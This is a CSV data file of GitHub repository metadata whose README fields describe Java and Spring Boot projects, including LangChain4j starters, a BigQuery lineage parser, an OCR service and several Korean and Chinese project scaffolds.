repo,branch,readme,releases_count,open_issues_count,branches_count,license
jocrugon/Pokedex,main,"# Pokedex
API desarrollado en java con spring boot, usando arquitectura hexagonal, swagger, manejador de excepciones y 2 bases de datos MySQL y MongoDB
las bases de datos están en el archivo docker-compose, también la creación de la imagen del API indicado en el Dockerfile

- SWAGGER

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/5ddeaab8-61ac-41cb-b435-452ebdf30091)

- Arquitectura Hexagonal

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/b692b471-88d9-43e6-9a75-4e8732a4cf4e)

- Docker

![imagen](https://github.com/jocrugon/Pokedex/assets/93726141/49cfcd81-be7a-4594-88db-892525dd5bd2)

",0,0,1,
MarchLiu/in-the-shell,main,,0,0,1,
ThomasVitale/langchain4j-spring-boot,main,"# LangChain4j Spring Boot

This project brings [LangChain4j](https://github.com/langchain4j) support in Spring Boot
to build AI and LLM-powered applications. It provides integrations with LLM services
and vector stores, as well as tools, chains, and AI services.

Using the starter projects in this repository, you gain the following advantages over
using the vanilla LangChain4j libraries in Spring Boot:

* Autoconfiguration and unified configuration properties for models and vector stores
* HTTP infrastructure with RestClient, WebClient, and Jackson for all integrations
* Built-in observability with Micrometer, including LLM-specific metrics and traces
* Dev services with Docker Compose and Testcontainers for models and vector stores
* Service bindings for automatic connection configuration when running on Kubernetes.

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* Docker/Podman
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application with LangChain4j support.

First, add the LangChain4j Spring Boot catalog providing the project templates.

```shell
spring project-catalog add langchain4j https://github.com/ThomasVitale/langchain4j-spring-boot
```

Then, create a new Spring Boot project for building an LLM Applications with LangChain4j and Ollama.

```shell
spring boot new myapp langchain4j-chat-ollama
```

Finally, navigate to the `myapp` folder and run the Spring Boot application. The first time you run it,
it will take a while to download the Ollama container image used as a dev service based on the Testcontainers
Spring Boot integration.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application that will use Ollama and _llama3_ to generate a text response.
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ai/chat message==""What is the capital of Italy?""
```

## 🦜 Models

### OpenAI

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-openai-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  open-ai:
    client:
      api-key: ${OPENAI_API_KEY}
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

### Ollama

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-ollama-spring-boot-starter:0.9.0'
```

Configuration:

```yaml
langchain4j:
  ollama:
    chat:
      model: llama3
```

Example:

```java
@RestController
class ChatController {
    private final ChatLanguageModel chatLanguageModel;

    ChatController(ChatLanguageModel chatLanguageModel) {
        this.chatLanguageModel = chatLanguageModel;
    }

    @GetMapping(""/ai/chat"")
    String chat(@RequestParam(defaultValue = ""What did Gandalf say to the Balrog?"") String message) {
        return chatLanguageModel.generate(message);
    }
}
```

## 🫙 Vector Stores

### Chroma

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-chroma-spring-boot-starter:0.9.0'
```

Example:

```java
class ChromaDataIngestor {
    private final ChromaEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(ChromaEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

### Weaviate

Gradle:

```groovy
implementation 'io.thomasvitale.langchain4j:langchain4j-weaviate-spring-boot-starter:0.9.0'
```

Example:

```java
class WeaviateDataIngestor {
    private final WeaviateEmbeddingStore embeddingStore;
    private final EmbeddingModel embeddingModel;

    ChatController(WeaviateEmbeddingStore embeddingStore, EmbeddingModel embeddingModel) {
        this.embeddingStore = embeddingStore;
        this.embeddingModel = embeddingModel;
    }

    public void ingest(List<Document> documents) {
        EmbeddingStoreIngestor ingestor = EmbeddingStoreIngestor.builder()
                .embeddingStore(embeddingStore)
                .embeddingModel(embeddingModel)
                .documentSplitter(recursive(300, 0))
                .build();
        ingestor.ingest(documents);
    }
}
```

## 🌟 Examples

Check these [examples](https://github.com/ThomasVitale/llm-apps-java-langchain4j) to see LangChain4j and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",16,4,1,Apache-2.0
Laurc2004/ocr-ddd,master-cloud,"# OCR 项目 :sparkles:

## 📚 项目简介 :sunrise:

本项目是一个结合了DDD（领域驱动设计）架构理念的Java-Python跨界之作，旨在提供精准高效的OCR服务。

利用Python的[Paddle OCR](https://github.com/PaddlePaddle/PaddleOCR)库进行文字识别，该库以其高准确率和对复杂场景的适应性著称，能够轻松识别包括180°翻转在内的多种文本形式。

与此同时，Java部分采用了DDD架构，不仅加深了业务理解，也提升了代码的可维护性和扩展性。

前端则选用了Ant Design Pro，为用户提供流畅的交互体验。

前端代码仓库同样开源，欢迎您查阅和贡献：

- **前端项目地址**：[Laurc2004/ocr-frontend](https://github.com/Laurc2004/ocr-frontend) 使用Ant Design Pro构建，为用户带来极致的Web体验。

## 🔄 调用流程与功能说明 :gear:

### 💻 单体版本

- **公众号集成**：用户通过公众号发送图片或图片链接，根据引导即可启动OCR服务。
- **Python OCR引擎**：图片信息转发至Python后端，调用Paddle OCR进行文字识别。
- **Java处理逻辑**：识别结果被Java后端反序列化，提取关键信息并暂存于Redis（时效5分钟），利用线程池与Redission实现并发控制与流量限制。

### 🌐 微服务版本

- **Web界面操作**：用户访问Web界面，关注公众号后获取验证码登录，享受更丰富的功能。
- **用户认证与注册**：通过Spring Security实现安全验证，新用户自动注册。
- **多样化识别选项**：支持上传文件或输入URL，策略模式与工厂模式灵活选择处理策略，预留扩展接口如Base64识别。
- **结果输出定制**：提供专业模式输出详细坐标信息及文本识别分数，非专业模式则快速提取特定类型信息（如英文、车牌、身份证号等）。
- **支付与订单管理**：集成微信支付，采用EventBus解耦支付回调逻辑，配合定时任务处理异常订单。（前端暂时未做，本人微信商户到期）

## 🎨 功能展示 :framed_picture:

- **体验地址**：[在线体验](http://lixp.online:9888/)

- **截图预览**：
单体：
<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/6e9a1c79-c792-4b6d-870a-09333161afeb"" width=""400"">




微服务：





<img src=""https://github.com/Laurc2004/ocr-ddd/assets/119660750/144790bb-698d-4a5f-addd-701667df94a4"" width=""400"">

![image](https://github.com/Laurc2004/ocr-ddd/assets/119660750/4b65ddd4-9aae-4f26-a35f-19897c32ec19)

- **测试图片**：[示例图片](https://img0.pcauto.com.cn/pcauto/1812/25/14171817_paizhao.jpg)

## 🛠️ 软件架构 :wrench:

遵循DDD原则，项目分为四层：

- **触发层**：http、消息队列、定时任务等
- **应用层**：协调业务逻辑
- **领域层**：核心业务规则与实体
- **基础设施层**：数据库、缓存等

## 🔧 技术栈亮点 :key:

### Java & 中间件

- **Spring生态**：Spring Boot, MVC, Security
- **网络与数据**：Okhttp, Jackson, Mybatis, MySQL, Redis
- **API管理与文档**：Knife4j
- **开发辅助**：Lombok
- **消息传递**：EventBus（Guava）
- **配置与服务发现**：Nacos
- **流量控制**：Sentinel
- **分布式锁**：Redission

### Python

- **轻量级Web框架**：Flask
- **OCR库**：PaddleOCR

### 前端技术

- **React + Ant Design Pro**：构建现代Web应用
- **ArkTs**（规划中）：面向鸿蒙应用的TypeScript库
- **ReactNative**（规划中）：面向移动端

## 📖 安装部署教程 :book:

[1.0.0简易版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(1.0.0%E7%AE%80%E6%98%93%E7%89%88))
[2.0.0微服务版教程](https://github.com/Laurc2004/ocr-ddd/wiki/%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%95%99%E7%A8%8B(2.0.0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%89%88))

欢迎Star🌟 和Fork该项目，您的反馈与贡献是我们不断进步的动力！
",0,0,3,Apache-2.0
arconia-io/arconia,main,"# Arconia

Arconia is a framework to build SaaS, multitenant applications using Java and Spring Boot.

<img src=""arconia-logo.png"" alt=""The Arconia logo"" height=""250px"" />

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application using the Arconia framework.

First, add the Arconia Spring catalog providing the project templates.

```shell
spring project-catalog add arconia https://github.com/arconia-io/arconia
```

Then, create a new Spring Boot project for building a multitenant web application.

```shell
spring boot new myapp arconia-web
```

Finally, navigate to the `myapp` folder and run the Spring Boot application.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application as one of the valid tenants (`dukes` or `beans`).
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ X-TenantId:dukes
```

## 🌟 Examples

Check these [examples](https://github.com/arconia-io/arconia-samples) to see Arconia and Spring Boot in action.

## 🛡️&nbsp; Security

The security process for reporting vulnerabilities is described in [SECURITY.md](SECURITY.md).

## 🖊️&nbsp; License

This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for more information.
",5,9,1,Apache-2.0
iot/jetbra,main,,0,0,1,MIT
retrogemHK/codingtest_java,main,"# 코딩 테스트 합격자 되기(자바 편)
- 프로그래머스에서 엄선한 기출 문제에 대한 상세한 풀이 제공
- 들고 다닐 수 있는 요약 노트 제공
- 실전 문제 위주로 출제된 기출 문제 5회분 제공(회당 3 문제)


## 📖 도서 구매 링크
- Yes24 : https://www.yes24.com/Product/Goods/125183948
- 교보문고 : https://product.kyobobook.co.kr/detail/S000212576322
- 알라딘 : https://www.aladin.co.kr/shop/wproduct.aspx?ItemId=335109613
- 리디북스(Ebook) : https://ridibooks.com/books/4547000036

<img width=""464"" alt=""image"" src=""https://github.com/retrogemHK/codingtest_java/assets/14954690/16687a4f-c529-407c-a44b-15a9677f0eac"">

# 정오표
[클릭](https://docs.google.com/spreadsheets/d/16ZWyC2xlylfsGBdyt2YMT8ogpukNh7sXsHrfx5qQuFk/edit#gid=0)

# 책소개
![image](https://github.com/retrogemHK/codingtest_java/blob/main/assets/java_image.jpg)


# 진행중인 이벤트
| Event    | 세부내용                                    |기간 |
| ---------- | ---------------------------------------------- |---------------------------------------------- |
|코딩테스트 스터디       |[참여방법 및 스터디 세부사항](https://cafe.naver.com/dremdeveloper/948)              | 상시 |



# 코딩테스트 소통공간(저자가 직접운영)
| Title    | Description                                    |
| ---------- | ---------------------------------------------- |
|카카오톡 오픈채팅        |[클릭](https://open.kakao.com/o/gQOVhU3f)              |

# 연락처
- 해당 코드들에 대해 문의사항이 있거나, 연락이 필요한 경우 아래 참조

| Title             | Description                                     |
|-------------------|-------------------------------------------------|
| Cafe              | http://cafe.naver.com/dremdeveloper             |
| Business Mail     | kylados@naver.com                               |
| Codingtest Python | https://github.com/dremdeveloper/codingtest_python |
| Codingtest CPP    | https://github.com/dremdeveloper/codingtest_cpp |
# 폴더 구조
- 깃 허브의 폴더 구조에 대한 설명

| Title    | Description                                    |
| ---------- | ---------------------------------------------- |
| errorcode        | 구현시 자주 발생하는 에러메시지                |
| mistake        | 구현시 자주 실수할수 있는 사항                |
| performance        | 비슷한 동작을 하는데 시간복잡도가 다른 경우에 대한 시간비교             |
| reference        | 코딩테스트에서 많이 사용하는 문법                         |
| solution        | 책에 있는 문제에 대한 해설                         |
| Algorithm_with_DataStructure        | 코딩테스트에 등장하는 알고리즘과 자료구조                        |
",0,0,1,
borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.
",0,1,1,MIT
uncarbon97/helio-boot-modular,2.x,"# helio-boot-modular

## 项目介绍
基于 Spring Boot 3.x，是一款预置SaaS、RBAC能力的单体项目脚手架，适合初学者学习 JavaWeb 开发的良好实践  
按职责拆分为多Maven模块，依然是大单体，但命名及用途对标`helio-cloud`；适合多人协作、但不打算使用微服务架构的团队  
单模块版请移步至[helio-boot](https://github.com/uncarbon97/helio-boot)项目

JDK compatibility: 17 - 21

【[前端演示站](https://helio-demo.uncarbon.cc/)】
【[官方文档](https://helio.uncarbon.cc/)】 
【[主要技术栈依赖](https://helio.uncarbon.cc/#/i18n/zh-CN/helio-starters/dependencies)】
【[快速启动步骤](https://helio.uncarbon.cc/#/i18n/zh-CN/helio-boot/quick-start)】
【[更新记录](https://helio.uncarbon.cc/#/i18n/zh-CN/appendix/change-log)】
【[编码良好实践](https://helio.uncarbon.cc/#/i18n/zh-CN/experience/good-practices)】

需要先安装 `MySQL`、`Redis` 等必需中间件

基础支撑构件 [helio-starters](https://github.com/uncarbon97/helio-starters) 已推送至Maven中央仓库，加载时会自动拉取

## 配套后台管理前端模板 & 代码生成器
| 项目名                  | 简介                                                                          | Gitee                                                      | GitHub                                                       |
|----------------------|-----------------------------------------------------------------------------|------------------------------------------------------------|--------------------------------------------------------------|
| helio-generator      | 可一键生成单体or微服务版的前、后端代码，减少无谓的重复劳动                                              | [Gitee](https://gitee.com/uncarbon97/helio-generator)      | [GitHub](https://github.com/uncarbon97/helio-generator)      |
| helio-admin-vue-vben | 基于[Vue vben admin](https://github.com/anncwb/vue-vben-admin) 改造适配的前端框架，开箱即用 | [Gitee](https://gitee.com/uncarbon97/helio-admin-vue-vben) | [GitHub](https://github.com/uncarbon97/helio-admin-vue-vben) |

## 源码包结构
```
├───api
│   ├───admin-api  【Maven模块】admin-api，用于后台管理的HTTP-API
│   │   └───src
│   │       └───main
│   │           └───java
│   │               └───cc
│   │                   └───uncarbon
│   │                       └───module
│   │                           └───adminapi
│   │                               ├───aspect         自定义切面
│   │                               │   └───extension  自定义切面扩展类
│   │                               ├───constant       常量
│   │                               ├───helper         助手类
│   │                               ├───model          抽象模型
│   │                               │   └───response   用于响应的
│   │                               ├───util           静态工具类
│   │                               └───web            即：Controller
│   │                                   ├───auth       登录登出接口
│   │                                   ├───common     常用通用接口
│   │                                   ├───oss        对象存储接口
│   │                                   └───sys        预置系统管理接口（如：后台用户、后台角色、后台菜单等）
│   └───app-api 【Maven模块】app-api，用于C端的HTTP-API【只是一个骨架，并没有业务实现】
│       └───src
│           └───main
│               └───java
│                   └───cc
│                       └───uncarbon
│                           └───module
│                               └───appapi
│                                   ├───constant  常量
│                                   └───web       即：Controller
├───attachments  附件
│   └───db  数据库变更脚本
│       ├───MySQL
│       │   └───upgrade  Helio升级时MySQL变更脚本
│       └───PostgreSQL
│           └───upgrade  Helio升级时PostgreSQL变更脚本
├───bootstrap  【Maven模块】项目主入口，负责启动SpringBoot
│   └───src
│       ├───main
│       │   ├───java
│       │   │   └───cc
│       │   │       └───uncarbon
│       │   │           ├───config       全局配置类
│       │   │           └───interceptor  Web拦截器
│       │   └───resources  资源，包含符合Spring Boot标准的YAML配置文件、Logback配置文件等
│       │       └───i18n  国际化文案定义
├───service-module
│   ├───oss  【Maven模块】对象存储服务
│   │   ├───oss-facade  【Maven模块】对象存储服务门面
│   │   │   └───src
│   │   │       └───main
│   │   │           └───java
│   │   │               └───cc
│   │   │                   └───uncarbon
│   │   │                       └───module
│   │   │                           └───oss
│   │   │                               ├───constant  常量
│   │   │                               ├───enums     枚举
│   │   │                               ├───facade    门面
│   │   │                               └───model     抽象模型
│   │   │                                   ├───request   用于请求的
│   │   │                                   └───response  用于响应的
│   │   └───oss-service  【Maven模块】对象存储服务实现
│   │       └───src
│   │           └───main
│   │               └───java
│   │                   └───cc
│   │                       └───uncarbon
│   │                           └───module
│   │                               └───oss
│   │                                   ├───biz      门面实现类
│   │                                   ├───config   配置类
│   │                                   ├───entity   实体
│   │                                   ├───mapper   Mybatis Mapper
│   │                                   └───service  服务类
│   └───sys  【Maven模块】预置系统管理服务
│       ├───sys-facade  【Maven模块】预置系统管理服务门面
│       │   └───src
│       │       └───main
│       │           └───java
│       │               └───cc
│       │                   └───uncarbon
│       │                       └───module
│       │                           └───sys
│       │                               ├───annotation  自定义注解
│       │                               ├───constant    常量
│       │                               ├───enums       枚举
│       │                               ├───extension   自定义扩展
│       │                               │   └───impl    自定义扩展实现类
│       │                               ├───facade  门面
│       │                               └───model   抽象模型
│       │                                   ├───request   用于请求的
│       │                                   └───response  用于响应的
│       └───sys-service  【Maven模块】预置系统管理服务实现
│           └───src
│               └───main
│                   └───java
│                       └───cc
│                           └───uncarbon
│                               └───module
│                                   └───sys
│                                       ├───biz      门面实现类
│                                       ├───entity   实体
│                                       ├───mapper   Mybatis Mapper
│                                       │   └───xml  Mybatis Mapper XML
│                                       ├───service  服务类
│                                       └───util     静态工具类
```
",7,0,3,MulanPSL-2.0
sosow0212/2024-e-market,develop,"# E-market (24.01 ~ 05)

## 목차

1. [프로젝트 소개](#프로젝트-소개)
2. [개발 내용](#개발-내용)
    - [기능 개발](#기능-개발)
    - [아키텍처](#아키텍처)
3. [인프라](#인프라)
4. [테스트 및 커버리지](#테스트)

---    

## 프로젝트 소개

<p>
(1인 프로젝트)

아래 설문을 바탕으로 교내 중고 거래 서비스의 필요함을 인지하고 기획하게 된 대학생을 위한 교내 중고거래 플랫폼입니다.

학교와 제휴를 통해 쿠폰을 지급하고 교내 서적 및 필요한 비품을 저렴하게 구매할 수 있습니다.

<img width=""592"" alt=""스크린샷 2024-03-13 오후 8 44 22"" src=""https://github.com/sosow0212/2024-electronic-market/assets/63213487/0e01419e-841b-4373-befd-550660d435d9"">


</p>

--- 

## 개발 내용

### 기능 개발

- [x] 테스트 격리 유틸 생성 및 REST Docs Helper
  생성 ([해당 과정 포스팅 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223315262688&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원가입 및
  로그인 ([해당 과정 포스팅 및 고민한 점 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223317675973&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원가입 이메일 전송 비동기 구현 및 미전송 메일 처리해주는 기능
  구현 ([해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223322476947&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 회원 간 커뮤니티 기능 생성 및 동시성
  처리 ([다양한 동시성 처리 방법 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223328710499&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 쿠폰 기능 생성 및 금액 할인 도메인 서비스 구현
- [x] 마켓에 물품을 올리고 구매할 수 있는 기능 구현
- [x] 멀티모듈 분리 -> API, Batch 서버 ([멀티모듈로 분리한 이유](https://blog.naver.com/sosow0212/223401237314))
    - [x] 기존 이벤트를 Redis pub/sub으로 변경 ([Redis Pub/Sub로 이벤트 수신하기](https://blog.naver.com/sosow0212/223408645604))
    - [x] batch-server의 스케일아웃 환경에서 스케줄링 작업이 중복되는 문제 해결 ([스케줄링 중복 문제 해결](https://blog.naver.com/sosow0212/223408645604))

---

## 아키텍처

- **24.04.16 기준 서버 아키텍처**
    - 현재 SPOF 지점 : MySQL, Redis (개선 예정)
    - <img width=""1532"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/23a96925-4dbb-40ca-a41b-910a4bc7ac8a"">

---

### 인프라

- [x] Github Actions를 이용한 CI 환경
  생성 ([해당 과정 포스팅 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223314392944&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
- [x] 인프라 환경 구축하기 1차
    - [x] Jenkins를 이용한 CD 환경
      구축 ([아키텍처 및 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223369462311&categoryNo=152&parentCategoryNo=152&from=thumbnailList))
    - [x] Prometheus, Grafana 이용한 모니터링
      구축 ([아키텍처 및 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223369973401&categoryNo=161&parentCategoryNo=152&viewDate=&currentPage=1&postListTopCurrentPage=1&from=thumbnailList&userTopListOpen=true&userTopListCount=5&userTopListManageOpen=false&userTopListCurrentPage=1))
    - [x] Docker 이미지로 서버를 작동하도록 변경 및 무중단배포
      적용 ([새로운 아키텍처와 해당 과정 보러가기](https://blog.naver.com/PostView.naver?blogId=sosow0212&logNo=223371181808&categoryNo=161&parentCategoryNo=152&viewDate=&currentPage=1&postListTopCurrentPage=1&from=thumbnailList&userTopListOpen=true&userTopListCount=5&userTopListManageOpen=false&userTopListCurrentPage=1)))

<img width=""1758"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/b2507a61-b6ca-45d1-bf08-704b66807069"">

---

## 테스트

- 24.04.16 기준 테스트 227개 및 커버리지 80% 이상

<img width=""838"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/89d4ccd8-f881-4a4b-adfc-a4b3d8ce9029"">

<img width=""655"" alt=""image"" src=""https://github.com/sosow0212/2024-mju-market/assets/63213487/967f8cfb-dd71-475d-821d-6767c87169d6"">
",0,5,59,
